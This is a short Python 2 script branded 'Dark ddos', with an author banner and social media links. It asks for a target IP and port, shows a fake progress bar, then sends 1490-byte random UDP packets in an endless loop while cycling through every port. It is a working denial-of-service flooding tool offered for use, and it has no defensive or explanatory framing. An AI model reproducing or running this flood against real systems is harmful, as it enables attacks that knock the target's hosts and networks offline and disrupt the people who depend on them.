import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Dark ddos")
print
print "Author   : D1ARK-VA4U3"
print "Twitter  : https://twitter.com/AriyanNijhum?s=09"
print "team.BCA : white-hat-Hackers"
print "Facebook : https://www.facebook.com/dark.vau.its.official"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Dark Attack Starting")
print "[                    ] 0% Dark "
time.sleep(5)
print "[=====               ] 25% Dark"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%Attack.by.Dark"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

